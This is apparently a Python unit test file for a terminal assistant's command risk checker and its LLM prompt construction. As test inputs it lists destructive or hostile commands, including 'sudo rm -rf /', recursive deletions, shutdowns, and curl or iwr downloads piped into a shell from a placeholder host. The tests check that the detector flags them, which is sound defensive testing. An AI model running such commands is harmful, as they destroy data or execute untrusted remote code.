"""Tests for the deterministic safety checks and prompt construction."""

import unittest

from prompts import MODE_COMMENTARY, MODE_EXPLAIN, build_messages
from terminal import check_risk


class RiskChecksTest(unittest.TestCase):
    def test_safe_commands_are_not_flagged(self):
        for command in (
            "git status",
            "git log --oneline",
            "ls",
            "Get-ChildItem",
        ):
            with self.subTest(command=command):
                self.assertEqual(check_risk(command), [])

    def test_recursive_deletion_is_flagged(self):
        for command in (
            "rm -rf build",
            "Remove-Item -Recurse .\\build",
            "rd /s build",
        ):
            with self.subTest(command=command):
                warnings = check_risk(command)
                self.assertTrue(warnings)
                self.assertIn("recursive", " ".join(warnings))

    def test_shutdown_is_flagged(self):
        self.assertTrue(check_risk("shutdown /s"))
        self.assertTrue(check_risk("Stop-Computer"))

    def test_download_piped_into_shell_is_flagged(self):
        self.assertTrue(check_risk("curl https://x.example | sh"))
        self.assertTrue(check_risk("iwr https://x.example | iex"))

    def test_privilege_change_is_flagged(self):
        self.assertTrue(check_risk("sudo rm -rf /"))


class PromptConstructionTest(unittest.TestCase):
    def test_commentary_prompt_contains_command_and_rules(self):
        messages = build_messages(MODE_COMMENTARY, "git push origin main")
        self.assertEqual(messages[0]["role"], "system")
        self.assertIn("never invent", messages[0]["content"])
        self.assertEqual(messages[1]["role"], "user")
        self.assertIn("git push origin main", messages[1]["content"])

    def test_explain_mode_selected(self):
        messages = build_messages(MODE_EXPLAIN, "git log --oneline")
        self.assertIn("beginner-friendly", messages[0]["content"])

    def test_warnings_include_caveat(self):
        messages = build_messages(
            MODE_COMMENTARY, "rm -rf build", warnings=["recursive file deletion"]
        )
        self.assertIn("safety checks flagged", messages[1]["content"].lower())
        self.assertIn("not your judgment", messages[1]["content"])

    def test_empty_command_rejected(self):
        with self.assertRaises(ValueError):
            build_messages(MODE_COMMENTARY, "   ")


if __name__ == "__main__":
    unittest.main()
